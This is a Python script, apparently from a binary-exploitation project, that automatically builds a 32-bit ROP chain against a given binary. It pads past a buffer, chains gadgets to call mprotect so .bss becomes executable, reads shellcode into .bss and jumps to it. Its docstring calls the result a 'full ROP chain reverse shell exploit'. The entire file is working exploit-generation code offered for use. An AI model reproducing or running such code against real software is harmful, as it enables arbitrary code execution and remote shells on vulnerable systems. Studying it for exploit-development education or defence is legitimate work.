import sys
from os import stat
from struct import pack
from itertools import permutations, product

import address_pop
import exploit_gadgets
import junk_length_and_addresses
from get_gadgets import get_gadgets, push_to_reg




def valid(elem, rest):
    return not any(dep in [x[0] for x in rest] for dep in elem[1][1])

def schedule(commands):
    # Iterate over every possible combination of gadget chains for each register
    for gadgets in product(*commands.values()):
        choice = {list(commands.keys())[i] : gadgets[i] for i in range(len(gadgets))}
        # Iterate over every possible ordering of the given combination
        for order in permutations(choice.items()):
            for i in range(1,len(order)):
                if not valid(order[i],order[:i]):
                    break
            else:
                # If the loop terminates normally, then this is a valid combo + ordering
                exploit = b""
                for elem in order:
                    exploit += elem[1][0]
                return exploit
            

    print("No valid order!")
    return -1

def rop_exploit(binary_name):
    """Create the full ROP chain reverse shell exploit

    :param cli_args: The command line arguments
    :param base_address: The base .data address
    :return: The full ROP chain reverse shell exploit packed bytes sequence
    """
    rop = exploit_gadgets.ROPgadgets(binary_name)
    gadgets = get_gadgets(rop)
    
    INT80     = pack('<I', rop.get_gadget("int 0x80 ; ret")) # int 0x80
    (padding, data, bss) = junk_length_and_addresses.get_everything(binary_name)
    
    # We need to align the BSS with the page size
    bss = (bss & 0xfffff000)
    print(f".bss located at {bss:x}")

    # Padding
    exploit = b'\x41' * padding

    shellcode_len = stat(sys.argv[3]).st_size
    commands = {"eax" : push_to_reg(0x0000007D,"eax",gadgets,rop),    
                "ebx" : push_to_reg(bss,"ebx",gadgets,rop),
                "ecx" : push_to_reg(0x0000800,"ecx",gadgets,rop),
                "edx" : push_to_reg(0x0000007,"edx",gadgets,rop)}
    exploit += schedule(commands)
    exploit += INT80 # int 0x80

    print("Made BSS executable")


    # # Read into BSS
    commands = {"eax" : push_to_reg(3,"eax",gadgets,rop),
                "ebx" : push_to_reg(0,"ebx",gadgets,rop),
                "ecx" : push_to_reg(bss,"ecx",gadgets,rop), 
                "edx" : push_to_reg(shellcode_len,"edx",gadgets,rop)}

    
    exploit += schedule(commands)
    exploit += INT80

    print("Added read code")

    # We must jump to an offset of BSS as BSS contains null characters
    exploit += pack('<I', bss + 4) 

    return exploit


def main():
    if len(sys.argv) < 4:
        print("Usage mprotect.py <binary name> <payload name> <shellcode name>")
        exit(1)

    binary_name = sys.argv[1]
    fileName=sys.argv[2]

    outfile=open(fileName, "wb")
    outfile.write(rop_exploit(binary_name))
    outfile.close()


if __name__ == "__main__":
    main()
